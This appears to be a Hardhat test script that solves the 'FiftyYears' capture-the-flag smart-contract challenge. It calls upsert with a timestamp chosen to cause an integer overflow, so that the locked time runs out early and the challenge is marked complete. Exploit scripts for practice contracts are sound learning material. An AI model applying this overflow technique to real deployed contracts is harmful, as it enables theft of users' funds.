import { expect } from 'chai';
import { ethers } from 'hardhat';
import { etherToWei } from '../utils';

// 31557600 seconds in 1 year
const yearsToSeconds = (years: number) => years * 31557600;

const currentUnixTimestamp = () => Math.floor(Date.now() / 1000);

describe('FiftyYears', function () {
  it('should', async function () {
    const [, player] = await ethers.getSigners();

    const Challenge = await ethers.getContractFactory('FiftyYears');
    const challenge = await Challenge.deploy(player.address, {
      value: etherToWei(1),
    });
    await challenge.deployed();

    let head = await challenge.head();
    console.log('head', head);

    const first_contribution_unlock_timestamp =
      currentUnixTimestamp() + yearsToSeconds(50);
    const MAX_UINT256 = ethers.BigNumber.from(2).pow(256).sub(1);

    const timestamp = MAX_UINT256.sub(first_contribution_unlock_timestamp);
    // const timestamp = currentUnixTimestamp();
    console.log('timestamp', timestamp);
    let tx = await challenge.connect(player).upsert(0, timestamp, {
      value: etherToWei(1),
    });
    await tx.wait();

    const contribution = await challenge.queue(1);
    console.log(contribution);

    expect(await challenge.isComplete()).to.be.true;
  });
});
